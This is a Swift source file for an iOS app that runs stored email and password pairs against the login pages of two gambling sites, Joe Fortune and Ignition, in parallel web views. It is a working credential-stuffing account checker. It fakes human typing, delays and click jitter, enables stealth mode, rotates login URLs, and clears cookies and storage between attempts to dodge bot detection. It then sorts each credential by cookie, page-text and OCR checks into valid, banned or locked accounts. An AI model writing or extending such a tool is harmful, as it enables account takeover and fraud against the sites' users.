import Foundation
import UIKit
import WebKit

@MainActor
class DualSiteWorkerService {
    static let shared = DualSiteWorkerService()

    private let logger = DebugLogger.shared
    private let networkFactory = NetworkSessionFactory.shared
    private let notifications = PPSRNotificationService.shared
    private let blacklistService = BlacklistService.shared
    private let urlRotation = LoginURLRotationService.shared
    private let crashProtection = CrashProtectionService.shared
    private let screenshotManager = UnifiedScreenshotManager.shared
    private let visionOCR = VisionTextCropService.shared
    private let coordEngine = CoordinateInteractionEngine.shared
    private let typingEngine = HardwareTypingEngine.shared
    private let settlementGate = SettlementGateEngine.shared

    private func gaussianDelay(minVal: Double, maxVal: Double) -> Double {
        let mean = (minVal + maxVal) / 2.0
        let stdDev = (maxVal - minVal) / 4.0
        let u1 = Double.random(in: 0.0001...0.9999)
        let u2 = Double.random(in: 0.0001...0.9999)
        let z = sqrt(-2.0 * log(u1)) * cos(2.0 * .pi * u2)
        let delay = mean + z * stdDev
        return max(minVal, min(maxVal, delay))
    }

    struct WorkerResult {
        let session: DualSiteSession
        let joeOutcome: LoginOutcome?
        let ignitionOutcome: LoginOutcome?
        let pairedOCRStatus: String?
    }

    func runDualSiteSession(
        session: inout DualSiteSession,
        config: UnifiedSystemConfig,
        stealthEnabled: Bool,
        automationSettings: AutomationSettings = AutomationSettings(),
        onUpdate: @escaping (DualSiteSession) -> Void,
        onLog: @escaping (String, PPSRLogEntry.Level) -> Void
    ) async -> WorkerResult {
        let sessionId = "v42_\(session.credential.email.prefix(10))_\(UUID().uuidString.prefix(6))"
        let earlyStop = EarlyStopActor()

        onLog("V4.2 Worker \(sessionId): starting dual-site test for \(session.credential.email)", .info)

        session.currentAttempt = 0
        session.onlyIncorrectPassword = true
        onUpdate(session)

        let netConfig = networkFactory.appWideConfig(for: .joe)

        let joeSession = LoginSiteWebSession(
            targetURL: URL(string: resolveURL(for: .joefortune).absoluteString)!,
            networkConfig: netConfig
        )
        let ignSession = LoginSiteWebSession(
            targetURL: URL(string: resolveURL(for: .ignition).absoluteString)!,
            networkConfig: netConfig
        )

        joeSession.stealthEnabled = stealthEnabled
        ignSession.stealthEnabled = stealthEnabled

        await joeSession.setUp(wipeAll: true)
        await ignSession.setUp(wipeAll: true)

        defer {
            joeSession.tearDown(wipeAll: true)
            ignSession.tearDown(wipeAll: true)
        }

        onLog("V4.2: Navigating both sites in parallel...", .info)
        async let joeLoadTask = joeSession.loadPage(timeout: automationSettings.pageLoadTimeout)
        async let ignLoadTask = ignSession.loadPage(timeout: automationSettings.pageLoadTimeout)
        let joeLoaded = await joeLoadTask
        let ignLoaded = await ignLoadTask

        if !joeLoaded && !ignLoaded {
            onLog("V4.2: Both sites failed to load — connection failure", .error)
            session.globalState = .exhausted
            session.classification = .noAccount
            session.identityAction = .save
            session.endTime = Date()
            session.joeSiteResult = .unsure
            session.ignitionSiteResult = .unsure
            onUpdate(session)
            return WorkerResult(session: session, joeOutcome: .connectionFailure, ignitionOutcome: .connectionFailure, pairedOCRStatus: nil)
        }

        let joeSite = SiteTarget.joefortune
        let ignSite = SiteTarget.ignition

        let joeLoginBtnSelectors = [joeSite.selectors.submit, "button[type='submit']", "input[type='submit']"]
        let ignLoginBtnSelectors = [ignSite.selectors.submit, "button[type='submit']", "input[type='submit']"]

        async let joeStable: Void = {
            guard joeLoaded else { return }
            _ = await self.coordEngine.waitForButtonStable(selectors: joeLoginBtnSelectors, executeJS: { js in await joeSession.executeJS(js) }, stabilityMs: 300, timeoutMs: 5000, sessionId: sessionId)
        }()
        async let ignStable: Void = {
            guard ignLoaded else { return }
            _ = await self.coordEngine.waitForButtonStable(selectors: ignLoginBtnSelectors, executeJS: { js in await ignSession.executeJS(js) }, stabilityMs: 300, timeoutMs: 5000, sessionId: sessionId)
        }()
        _ = await (joeStable, ignStable)

        async let joeCookieDismiss: Void = {
            guard joeLoaded else { return }
            await joeSession.dismissCookieNotices()
        }()
        async let ignCookieDismiss: Void = {
            guard ignLoaded else { return }
            await ignSession.dismissCookieNotices()
        }()
        _ = await (joeCookieDismiss, ignCookieDismiss)
        onLog("V4.2: Cookie notices auto-dismissed on both sites", .info)

        let initDelay = Double.random(in: 0.0...6.0)
        onLog("V4.2: Initialization delay \(String(format: "%.1f", initDelay))s", .info)
        try? await Task.sleep(for: .seconds(initDelay))

        var lastJoeOutcome: LoginOutcome?
        var lastIgnOutcome: LoginOutcome?

        for attemptNum in 1...config.maxAttemptsPerSite {
            guard await earlyStop.isActive else { break }
            guard !Task.isCancelled else { break }

            session.currentAttempt = attemptNum
            onUpdate(session)
            onLog("V4.2: Attempt \(attemptNum)/\(config.maxAttemptsPerSite)", .info)

            if attemptNum > 1 {
                if automationSettings.clearCookiesBetweenAttempts || automationSettings.clearLocalStorageBetweenAttempts || automationSettings.clearSessionStorageBetweenAttempts {
                    let clearJS = Self.buildClearStorageJS(
                        clearCookies: automationSettings.clearCookiesBetweenAttempts,
                        clearLocalStorage: automationSettings.clearLocalStorageBetweenAttempts,
                        clearSessionStorage: automationSettings.clearSessionStorageBetweenAttempts
                    )
                    async let joeClear: String? = joeSession.executeJS(clearJS)
                    async let ignClear: String? = ignSession.executeJS(clearJS)
                    _ = await (joeClear, ignClear)
                    onLog("V4.2: Cleared data between attempts (cookies:\(automationSettings.clearCookiesBetweenAttempts) localStorage:\(automationSettings.clearLocalStorageBetweenAttempts) sessionStorage:\(automationSettings.clearSessionStorageBetweenAttempts))", .info)
                }

                let thinkDelay = gaussianDelay(
                    minVal: automationSettings.v42InterAttemptDelayMinSec,
                    maxVal: automationSettings.v42InterAttemptDelayMaxSec
                )
                onLog("V4.2: Inter-attempt delay \(String(format: "%.1f", thinkDelay))s", .info)
                try? await Task.sleep(for: .seconds(thinkDelay))
                guard await earlyStop.isActive else { break }
            }

            async let joeCookieCheck: Void = {
                guard joeLoaded else { return }
                await joeSession.dismissCookieNotices()
            }()
            async let ignCookieCheck: Void = {
                guard ignLoaded else { return }
                await ignSession.dismissCookieNotices()
            }()
            _ = await (joeCookieCheck, ignCookieCheck)

            async let joeNetIdle: Bool = self.coordEngine.checkNetworkIdle(executeJS: { js in await joeSession.executeJS(js) }, timeoutMs: 3000)
            async let ignNetIdle: Bool = self.coordEngine.checkNetworkIdle(executeJS: { js in await ignSession.executeJS(js) }, timeoutMs: 3000)
            _ = await (joeNetIdle, ignNetIdle)

            try? await Task.sleep(for: .milliseconds(Int.random(in: automationSettings.v42HumanVarianceMinMs...automationSettings.v42HumanVarianceMaxMs)))

            async let joePreClickTask = self.settlementGate.capturePreClickFingerprint(
                executeJS: { js in await joeSession.executeJS(js) },
                sessionId: sessionId
            )
            async let ignPreClickTask = self.settlementGate.capturePreClickFingerprint(
                executeJS: { js in await ignSession.executeJS(js) },
                sessionId: sessionId
            )
            let joePreClick = await joePreClickTask
            let ignPreClick = await ignPreClickTask

            let email = session.credential.email
            let password = session.credential.password

            let joeEmailSelectors = [joeSite.selectors.user, "input[type='email']", "input[name='email']", "input[name='username']", "input[type='text']:first-of-type"]
            let joePassSelectors = [joeSite.selectors.pass, "input[type='password']", "input[name='password']"]
            let ignEmailSelectors = [ignSite.selectors.user, "input[type='email']", "input[name='email']", "input[name='username']", "input[type='text']:first-of-type"]
            let ignPassSelectors = [ignSite.selectors.pass, "input[type='password']", "input[name='password']"]

            let joeExecuteJS: (String) async -> String? = { js in await joeSession.executeJS(js) }
            let ignExecuteJS: (String) async -> String? = { js in await ignSession.executeJS(js) }

            async let joeTypingDone: Bool = {
                guard joeLoaded else { return false }
                let emailOk = await self.typingEngine.focusAndType(
                    fieldSelectors: joeEmailSelectors,
                    text: email,
                    executeJS: joeExecuteJS,
                    minKeystrokeMs: config.humanEmulation.typingSpeedMin, maxKeystrokeMs: config.humanEmulation.typingSpeedMax,
                    clearFieldMethod: automationSettings.clearFieldMethod,
                    sessionId: sessionId
                )
                try? await Task.sleep(for: .milliseconds(Int.random(in: automationSettings.v42HumanVarianceMinMs...automationSettings.v42HumanVarianceMaxMs)))
                let passOk = await self.typingEngine.focusAndType(
                    fieldSelectors: joePassSelectors,
                    text: password,
                    executeJS: joeExecuteJS,
                    minKeystrokeMs: config.humanEmulation.typingSpeedMin, maxKeystrokeMs: config.humanEmulation.typingSpeedMax,
                    clearFieldMethod: automationSettings.clearFieldMethod,
                    sessionId: sessionId
                )
                return emailOk && passOk
            }()

            async let ignTypingDone: Bool = {
                guard ignLoaded else { return false }
                let emailOk = await self.typingEngine.focusAndType(
                    fieldSelectors: ignEmailSelectors,
                    text: email,
                    executeJS: ignExecuteJS,
                    minKeystrokeMs: config.humanEmulation.typingSpeedMin, maxKeystrokeMs: config.humanEmulation.typingSpeedMax,
                    clearFieldMethod: automationSettings.clearFieldMethod,
                    sessionId: sessionId
                )
                try? await Task.sleep(for: .milliseconds(Int.random(in: automationSettings.v42HumanVarianceMinMs...automationSettings.v42HumanVarianceMaxMs)))
                let passOk = await self.typingEngine.focusAndType(
                    fieldSelectors: ignPassSelectors,
                    text: password,
                    executeJS: ignExecuteJS,
                    minKeystrokeMs: config.humanEmulation.typingSpeedMin, maxKeystrokeMs: config.humanEmulation.typingSpeedMax,
                    clearFieldMethod: automationSettings.clearFieldMethod,
                    sessionId: sessionId
                )
                return emailOk && passOk
            }()

            let joeTyped = await joeTypingDone
            let ignTyped = await ignTypingDone

            onLog("V4.2: Typing complete — Joe:\(joeTyped) Ign:\(ignTyped)", joeTyped && ignTyped ? .success : .warning)

            try? await Task.sleep(for: .milliseconds(Int.random(in: automationSettings.v42HumanVarianceMinMs...automationSettings.v42HumanVarianceMaxMs)))

            guard await earlyStop.isActive else { break }

            async let joeClicked: Bool = {
                guard joeLoaded && joeTyped else { return false }
                let result = await self.coordEngine.coordinateClickWithFallback(
                    primarySelectors: joeLoginBtnSelectors,
                    fallbackSelectors: ["button", "[role='button']"],
                    executeJS: joeExecuteJS,
                    jitterPx: 3,
                    hoverDwellMs: 300,
                    sessionId: sessionId
                )
                return result.success
            }()

            async let ignClicked: Bool = {
                guard ignLoaded && ignTyped else { return false }
                let result = await self.coordEngine.coordinateClickWithFallback(
                    primarySelectors: ignLoginBtnSelectors,
                    fallbackSelectors: ["button", "[role='button']"],
                    executeJS: ignExecuteJS,
                    jitterPx: 3,
                    hoverDwellMs: 300,
                    sessionId: sessionId
                )
                return result.success
            }()

            let joeClickOk = await joeClicked
            let ignClickOk = await ignClicked

            onLog("V4.2: Click complete — Joe:\(joeClickOk) Ign:\(ignClickOk)", joeClickOk || ignClickOk ? .info : .warning)

            let joeURL = joeSession.targetURL.absoluteString
            let ignURL = ignSession.targetURL.absoluteString

            async let joeSettlement: SettlementGateEngine.SettlementResult? = {
                guard let joeFingerprint = joePreClick, joeClickOk else { return nil }
                return await self.settlementGate.waitForSettlement(
                    originalFingerprint: joeFingerprint,
                    executeJS: joeExecuteJS,
                    maxTimeoutMs: 15000,
                    preClickURL: joeURL,
                    sessionId: sessionId
                )
            }()
            async let ignSettlement: SettlementGateEngine.SettlementResult? = {
                guard let ignFingerprint = ignPreClick, ignClickOk else { return nil }
                return await self.settlementGate.waitForSettlement(
                    originalFingerprint: ignFingerprint,
                    executeJS: ignExecuteJS,
                    maxTimeoutMs: 15000,
                    preClickURL: ignURL,
                    sessionId: sessionId
                )
            }()
            let (joeSettleResult, ignSettleResult) = await (joeSettlement, ignSettlement)
            if let js = joeSettleResult {
                onLog("V4.2 JOE settlement: \(js.reason) (\(js.durationMs)ms)", js.settled ? .success : .warning)
            }
            if let is_ = ignSettleResult {
                onLog("V4.2 IGN settlement: \(is_.reason) (\(is_.durationMs)ms)", is_.settled ? .success : .warning)
            }

            let ssLimit = automationSettings.unifiedScreenshotsPerAttempt
            if ssLimit != .zero {
                let postClickDelay = automationSettings.unifiedScreenshotPostClickDelayMs
                let clickPriority = AutomationSettings.UnifiedScreenshotCount.priorityOrder(
                    forClickIndex: attemptNum - 1,
                    totalClicks: config.maxAttemptsPerSite
                )
                try? await Task.sleep(for: .milliseconds(postClickDelay))
                await capturePostClickScreenshots(
                    joeSession: joeSession,
                    ignSession: ignSession,
                    sessionId: session.id,
                    email: session.credential.email,
                    attemptNum: attemptNum,
                    clickPriority: clickPriority,
                    joeClickOk: joeClickOk,
                    ignClickOk: ignClickOk,
                    perSiteLimit: ssLimit.perCredentialPerSiteLimit
                )
                onLog("V4.2: Post-click screenshot captured (priority \(clickPriority), delay \(postClickDelay)ms)", .info)
            }

            try? await Task.sleep(for: .milliseconds(Int.random(in: automationSettings.v42HumanVarianceMinMs...automationSettings.v42HumanVarianceMaxMs)))

            async let joeOutcomeTask = self.evaluateSiteStrict(
                session: joeSession,
                site: "joe",
                attemptNum: attemptNum,
                maxAttempts: config.maxAttemptsPerSite,
                settlementResult: joeSettleResult,
                automationSettings: automationSettings,
                sessionId: sessionId
            )
            async let ignOutcomeTask = self.evaluateSiteStrict(
                session: ignSession,
                site: "ignition",
                attemptNum: attemptNum,
                maxAttempts: config.maxAttemptsPerSite,
                settlementResult: ignSettleResult,
                automationSettings: automationSettings,
                sessionId: sessionId
            )
            let joeOutcome = await joeOutcomeTask
            let ignOutcome = await ignOutcomeTask

            lastJoeOutcome = joeOutcome
            lastIgnOutcome = ignOutcome

            let now = Date()
            session.joeAttempts.append(SiteAttemptResult(
                siteId: "joe",
                attemptNumber: attemptNum,
                responseText: describeOutcome(joeOutcome),
                timestamp: now,
                durationMs: 0
            ))
            session.ignitionAttempts.append(SiteAttemptResult(
                siteId: "ignition",
                attemptNumber: attemptNum,
                responseText: describeOutcome(ignOutcome),
                timestamp: now,
                durationMs: 0
            ))

            if joeOutcome != .noAcc && joeOutcome != .unsure { session.onlyIncorrectPassword = false }
            if ignOutcome != .noAcc && ignOutcome != .unsure { session.onlyIncorrectPassword = false }

            let joeRegistered = session.joeAttempts.count
            let ignRegistered = session.ignitionAttempts.count
            session.joeSiteResult = SiteResult.fromLoginOutcome(joeOutcome, registeredAttempts: joeRegistered, maxAttempts: config.maxAttemptsPerSite)
            session.ignitionSiteResult = SiteResult.fromLoginOutcome(ignOutcome, registeredAttempts: ignRegistered, maxAttempts: config.maxAttemptsPerSite)

            if joeOutcome == .success || ignOutcome == .success {
                let trigSite = joeOutcome == .success ? "joe" : "ignition"
                await earlyStop.signalSuccess(from: trigSite)
                session.globalState = .success
                session.classification = .validAccount
                session.identityAction = .burn
                session.isBurned = true
                session.triggeringSite = trigSite
                session.endTime = Date()
                onLog("V4.2: SUCCESS on \(trigSite) — burning identity", .success)
                notifications.sendBatchComplete(working: 1, dead: 0, requeued: 0)
                await captureTerminalScreenshots(joeSession: joeSession, ignSession: ignSession, sessionId: session.id, email: session.credential.email, attemptNum: attemptNum, step: .successDetected, session: &session)
                screenshotManager.smartReduceForClearResult(sessionId: session.id)
                onLog("V4.2: Smart-reduced screenshots to 2 (1/site) for clear SUCCESS result", .info)
                break
            }

            if joeOutcome == .permDisabled || ignOutcome == .permDisabled {
                let trigSite = joeOutcome == .permDisabled ? "joe" : "ignition"
                await earlyStop.signalPermBan(from: trigSite)
                session.globalState = .abortPerm
                session.classification = .permanentBan
                session.identityAction = .burn
                session.isBurned = true
                session.triggeringSite = trigSite
                session.endTime = Date()
                onLog("V4.2: PERM BAN on \(trigSite) — burning identity", .error)
                blacklistService.addToBlacklist(session.credential.email, reason: "V4.2: perm disabled")
                await captureTerminalScreenshots(joeSession: joeSession, ignSession: ignSession, sessionId: session.id, email: session.credential.email, attemptNum: attemptNum, step: .terminalState, session: &session)
                screenshotManager.smartReduceForClearResult(sessionId: session.id)
                onLog("V4.2: Smart-reduced screenshots to 2 (1/site) for clear PERM BAN result", .info)
                break
            }

            if joeOutcome == .tempDisabled || ignOutcome == .tempDisabled {
                let trigSite = joeOutcome == .tempDisabled ? "joe" : "ignition"
                await earlyStop.signalTempLock(from: trigSite)
                session.globalState = .abortTemp
                session.classification = .temporaryLock
                session.identityAction = .save
                session.isBurned = false
                session.triggeringSite = trigSite
                session.endTime = Date()
                onLog("V4.2: TEMP LOCK on \(trigSite) — keeping identity", .warning)
                await captureTerminalScreenshots(joeSession: joeSession, ignSession: ignSession, sessionId: session.id, email: session.credential.email, attemptNum: attemptNum, step: .terminalState, session: &session)
                screenshotManager.smartReduceForClearResult(sessionId: session.id)
                onLog("V4.2: Smart-reduced screenshots to 2 (1/site) for clear TEMP LOCK result", .info)
                break
            }

            if attemptNum >= config.maxAttemptsPerSite {
                await earlyStop.signalExhausted()
                session.globalState = .exhausted
                session.classification = .noAccount
                session.identityAction = .save
                session.isBurned = false
                session.endTime = Date()
                onLog("V4.2: EXHAUSTED after \(attemptNum) attempts — \(session.onlyIncorrectPassword ? "only incorrect password" : "mixed responses")", .warning)
                await captureTerminalScreenshots(joeSession: joeSession, ignSession: ignSession, sessionId: session.id, email: session.credential.email, attemptNum: attemptNum, step: .finalState, session: &session)
                break
            }

            onLog("V4.2: Attempt \(attemptNum) — incorrect password, continuing...", .info)
            onUpdate(session)
        }

        let ssLimit = automationSettings.unifiedScreenshotsPerAttempt
        if ssLimit != .zero {
            screenshotManager.pruneByPriority(sessionId: session.id, limit: ssLimit.limit)
        }

        if session.globalState == .active {
            session.globalState = .exhausted
            session.classification = .noAccount
            session.identityAction = .save
            session.isBurned = false
            session.endTime = Date()
            if session.joeSiteResult == .pending { session.joeSiteResult = .unsure }
            if session.ignitionSiteResult == .pending { session.ignitionSiteResult = .unsure }
        }

        onUpdate(session)
        return WorkerResult(session: session, joeOutcome: lastJoeOutcome, ignitionOutcome: lastIgnOutcome, pairedOCRStatus: session.pairedOCRStatus)
    }

    /// Minimum page content length (chars) below which the page is considered blank.
    private static let minPageContentLength = 80
    /// Maximum number of 1-second OCR polls before returning .unsure.
    private static let maxOCRPollCount = 15
    /// OCR keywords that indicate success or terminal account states.
    private static let ocrSuccessErrorKeywords = ["has been disabled", "temporarily disabled", "recommended for you", "last played"]

    private func evaluateSiteStrict(
        session: LoginSiteWebSession,
        site: String,
        attemptNum _attemptNum: Int,
        maxAttempts _maxAttempts: Int,
        settlementResult: SettlementGateEngine.SettlementResult?,
        automationSettings: AutomationSettings,
        sessionId: String
    ) async -> LoginOutcome {
        let executeJS: (String) async -> String? = { js in await session.executeJS(js) }

        // Issue 14: about:blank / content length check
        let currentURL = await executeJS("(function(){try{return window.location.href||'';}catch(e){return'';}})()")  ?? ""
        if currentURL == "about:blank" || currentURL.isEmpty {
            logger.log("V4.2 EVAL [\(site)]: about:blank or empty URL — unsure", category: .evaluation, level: .warning, sessionId: sessionId)
            return .unsure
        }
        let pageContent = await session.getPageContent() ?? ""
        if pageContent.count < Self.minPageContentLength {
            logger.log("V4.2 EVAL [\(site)]: page content < \(Self.minPageContentLength) chars (\(pageContent.count)) — unsure", category: .evaluation, level: .warning, sessionId: sessionId)
            return .unsure
        }

        // Issue 9: Use settlement result if available — avoid duplicate work
        if let settle = settlementResult, settle.errorTextVisible {
            logger.log("V4.2 EVAL [\(site)]: settlement already detected error text — proceeding with DOM/OCR check", category: .evaluation, level: .info, sessionId: sessionId)
        }

        // Issue 3: Cookie-based success detection — check for session_id cookie
        let cookieResult = await executeJS("(function(){return document.cookie||'';})()")
        if let cookies = cookieResult,
           cookies.lowercased().range(of: #"(?:^|;\s*)session_id="#, options: .regularExpression) != nil {
            logger.log("V4.2 EVAL [\(site)]: SUCCESS — session_id cookie detected", category: .evaluation, level: .success, sessionId: sessionId)
            return .success
        }

        // Issue 1: 1-second bounded OCR polling loop (max 15 polls) for success/error markers
        let ocrKeywords = Self.ocrSuccessErrorKeywords
        let smsKeywordsLower = automationSettings.smsNotificationKeywords.map { $0.lowercased() }
        for pollIndex in 1...Self.maxOCRPollCount {
            guard !Task.isCancelled else { break }

            // P3 DOM check for "incorrect" (runs every cycle)
            let domContent = (await session.getPageContent() ?? "").lowercased()
            if domContent.contains("incorrect") {
                logger.log("V4.2 EVAL [\(site)]: 'incorrect' found in DOM (poll \(pollIndex))", category: .evaluation, level: .info, sessionId: sessionId)
                return .noAcc
            }

            // Check DOM for success/error keywords
            for keyword in ocrKeywords {
                if domContent.contains(keyword) {
                    if keyword == "has been disabled" {
                        logger.log("V4.2 EVAL [\(site)]: PERM_DISABLED via DOM — '\(keyword)' (poll \(pollIndex))", category: .evaluation, level: .critical, sessionId: sessionId)
                        return .permDisabled
                    } else if keyword == "temporarily disabled" {
                        logger.log("V4.2 EVAL [\(site)]: TEMP_DISABLED via DOM — '\(keyword)' (poll \(pollIndex))", category: .evaluation, level: .critical, sessionId: sessionId)
                        return .tempDisabled
                    } else {
                        logger.log("V4.2 EVAL [\(site)]: SUCCESS via DOM — '\(keyword)' (poll \(pollIndex))", category: .evaluation, level: .success, sessionId: sessionId)
                        return .success
                    }
                }
            }

            // Issue 11: SMS keyword detection via DOM
            if automationSettings.smsDetectionEnabled {
                for keyword in smsKeywordsLower {
                    if domContent.contains(keyword) {
                        logger.log("V4.2 EVAL [\(site)]: SMS keyword '\(keyword)' detected in DOM (poll \(pollIndex))", category: .evaluation, level: .warning, sessionId: sessionId)
                        return .smsDetected
                    }
                }
            }

            // OCR scan for success/error keywords
            if let screenshot = await session.captureScreenshot() {
                let ocrResult = await visionOCR.analyzeScreenshot(screenshot)
                let ocrLower = ocrResult.allText.lowercased()

                if ocrLower.contains("has been disabled") {
                    logger.log("V4.2 EVAL [\(site)]: PERM_DISABLED via OCR — 'has been disabled' (poll \(pollIndex))", category: .evaluation, level: .critical, sessionId: sessionId)
                    return .permDisabled
                }
                if ocrLower.contains("temporarily disabled") {
                    logger.log("V4.2 EVAL [\(site)]: TEMP_DISABLED via OCR — 'temporarily disabled' (poll \(pollIndex))", category: .evaluation, level: .critical, sessionId: sessionId)
                    return .tempDisabled
                }
                if ocrLower.contains("recommended for you") || ocrLower.contains("last played") {
                    logger.log("V4.2 EVAL [\(site)]: SUCCESS via OCR — lobby markers (poll \(pollIndex))", category: .evaluation, level: .success, sessionId: sessionId)
                    return .success
                }
                if ocrLower.contains("incorrect") {
                    logger.log("V4.2 EVAL [\(site)]: 'incorrect' via OCR (poll \(pollIndex))", category: .evaluation, level: .info, sessionId: sessionId)
                    return .noAcc
                }

                // Check for SMS keywords in OCR as well
                if automationSettings.smsDetectionEnabled {
                    for keyword in smsKeywordsLower {
                        if ocrLower.contains(keyword) {
                            logger.log("V4.2 EVAL [\(site)]: SMS keyword '\(keyword)' detected via OCR (poll \(pollIndex))", category: .evaluation, level: .warning, sessionId: sessionId)
                            return .smsDetected
                        }
                    }
                }
            }

            // Wait 1 second before next OCR poll
            try? await Task.sleep(for: .seconds(1))
        }

        logger.log("V4.2 EVAL [\(site)]: OCR polling exhausted (\(Self.maxOCRPollCount) polls) — unsure", category: .evaluation, level: .warning, sessionId: sessionId)
        return .unsure
    }

    private func resolveURL(for site: SiteTarget) -> URL {
        let isIgnition = site.id == "ignition"
        let wasIgnition = urlRotation.isIgnitionMode
        urlRotation.isIgnitionMode = isIgnition
        let url = urlRotation.nextURL() ?? URL(string: site.url)!
        urlRotation.isIgnitionMode = wasIgnition
        return url
    }

    private func describeOutcome(_ outcome: LoginOutcome) -> String {
        switch outcome {
        case .success: "Login successful"
        case .permDisabled: "Account permanently disabled"
        case .tempDisabled: "Account temporarily disabled"
        case .noAcc: "Incorrect password"
        case .unsure: "Uncertain result"
        case .connectionFailure: "Connection failure"
        case .timeout: "Timed out"
        case .smsDetected: "SMS notification detected"
        }
    }

    struct TerminalScreenshotResult {
        let hasImage: Bool
        let ocrOutcome: String
        let crucialMatches: [String]
        let fullText: String
        let confidence: Double
    }

    private func captureTerminalScreenshots(
        joeSession: LoginSiteWebSession,
        ignSession: LoginSiteWebSession,
        sessionId: String,
        email: String,
        attemptNum: Int,
        step: ScreenshotStep,
        session: inout DualSiteSession
    ) async {
        let pairTimestamp = Date()

        async let joeCapture: TerminalScreenshotResult = {
            guard let img = await joeSession.captureScreenshot() else {
                return TerminalScreenshotResult(hasImage: false, ocrOutcome: "", crucialMatches: [], fullText: "", confidence: 0)
            }
            await self.screenshotManager.addScreenshotDirect(
                image: img,
                sessionId: sessionId,
                credentialEmail: email,
                site: "joe",
                step: step,
                attemptNumber: attemptNum,
                clickPriority: 0,
                runVisionAnalysis: true
            )
            let analysis = await self.visionOCR.analyzeScreenshot(img)
            return TerminalScreenshotResult(
                hasImage: true,
                ocrOutcome: analysis.detectedOutcome.pairedLabel,
                crucialMatches: analysis.crucialMatches,
                fullText: String(analysis.allText.prefix(2000)),
                confidence: analysis.confidence
            )
        }()

        async let ignCapture: TerminalScreenshotResult = {
            guard let img = await ignSession.captureScreenshot() else {
                return TerminalScreenshotResult(hasImage: false, ocrOutcome: "", crucialMatches: [], fullText: "", confidence: 0)
            }
            await self.screenshotManager.addScreenshotDirect(
                image: img,
                sessionId: sessionId,
                credentialEmail: email,
                site: "ignition",
                step: step,
                attemptNumber: attemptNum,
                clickPriority: 0,
                runVisionAnalysis: true
            )
            let analysis = await self.visionOCR.analyzeScreenshot(img)
            return TerminalScreenshotResult(
                hasImage: true,
                ocrOutcome: analysis.detectedOutcome.pairedLabel,
                crucialMatches: analysis.crucialMatches,
                fullText: String(analysis.allText.prefix(2000)),
                confidence: analysis.confidence
            )
        }()

        let (joeResult, ignResult) = await (joeCapture, ignCapture)

        if joeResult.hasImage {
            session.joeOCRMetadata = SiteOCRMetadata(
                siteId: "joe",
                ocrOutcome: joeResult.ocrOutcome,
                crucialMatches: joeResult.crucialMatches,
                fullText: joeResult.fullText,
                confidence: joeResult.confidence,
                screenshotTimestamp: pairTimestamp
            )
        }
        if ignResult.hasImage {
            session.ignitionOCRMetadata = SiteOCRMetadata(
                siteId: "ignition",
                ocrOutcome: ignResult.ocrOutcome,
                crucialMatches: ignResult.crucialMatches,
                fullText: ignResult.fullText,
                confidence: ignResult.confidence,
                screenshotTimestamp: pairTimestamp
            )
        }

        if let joeOCR = session.joeOCRMetadata, let ignOCR = session.ignitionOCRMetadata {
            let paired = VisionTextCropService.pairedOCRStatus(
                joe: ocrLabelToOutcome(joeOCR.ocrOutcome),
                ignition: ocrLabelToOutcome(ignOCR.ocrOutcome)
            )
            logger.log("V4.2 OCR Paired: \(email) → \(paired)", category: .evaluation, level: .info)
        }
    }

    private func capturePostClickScreenshots(
        joeSession: LoginSiteWebSession,
        ignSession: LoginSiteWebSession,
        sessionId: String,
        email: String,
        attemptNum: Int,
        clickPriority: Int,
        joeClickOk: Bool,
        ignClickOk: Bool,
        perSiteLimit: Int
    ) async {
        let canCaptureJoe = joeClickOk && screenshotManager.canCapture(credentialEmail: email, site: "joe", limit: perSiteLimit)
        let canCaptureIgn = ignClickOk && screenshotManager.canCapture(credentialEmail: email, site: "ignition", limit: perSiteLimit)

        if !canCaptureJoe && joeClickOk {
            logger.log("V4.2 Screenshot: joe limit reached (\(perSiteLimit)/site) for \(email)", category: .screenshot, level: .trace)
        }
        if !canCaptureIgn && ignClickOk {
            logger.log("V4.2 Screenshot: ignition limit reached (\(perSiteLimit)/site) for \(email)", category: .screenshot, level: .trace)
        }

        async let joeCaptureDone: Void = {
            guard canCaptureJoe, let joeImg = await joeSession.captureScreenshot() else { return }
            await self.screenshotManager.addScreenshotDirect(
                image: joeImg,
                sessionId: sessionId,
                credentialEmail: email,
                site: "joe",
                step: .postClick,
                attemptNumber: attemptNum,
                clickPriority: clickPriority,
                runVisionAnalysis: false
            )
        }()
        async let ignCaptureDone: Void = {
            guard canCaptureIgn, let ignImg = await ignSession.captureScreenshot() else { return }
            await self.screenshotManager.addScreenshotDirect(
                image: ignImg,
                sessionId: sessionId,
                credentialEmail: email,
                site: "ignition",
                step: .postClick,
                attemptNumber: attemptNum,
                clickPriority: clickPriority,
                runVisionAnalysis: false
            )
        }()
        _ = await (joeCaptureDone, ignCaptureDone)
    }

    private func ocrLabelToOutcome(_ label: String) -> VisionTextCropService.DetectedOutcome {
        switch label {
        case "Perm Disabled": return .permDisabled
        case "Temp Disabled": return .tempDisabled
        case "Success": return .success
        case "No Acc": return .noAccount
        case "SMS Detected": return .smsVerification
        case "Error": return .errorBanner
        default: return .unknown
        }
    }

    // Note: document.cookie cannot remove HttpOnly cookies or cookies set with different path/domain.
    // For full isolation, consider using WKWebsiteDataStore.removeData() or recreating WKWebView.
    private static func buildClearStorageJS(clearCookies: Bool, clearLocalStorage: Bool, clearSessionStorage: Bool) -> String {
        var parts: [String] = []
        if clearCookies {
            parts.append("document.cookie.split(';').forEach(function(c){document.cookie=c.trim().split('=')[0]+'=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/';});")
        }
        if clearLocalStorage {
            parts.append("try{localStorage.clear();}catch(e){}")
        }
        if clearSessionStorage {
            parts.append("try{sessionStorage.clear();}catch(e){}")
        }
        return "(function(){\(parts.joined())return'CLEARED';})()"
    }
}
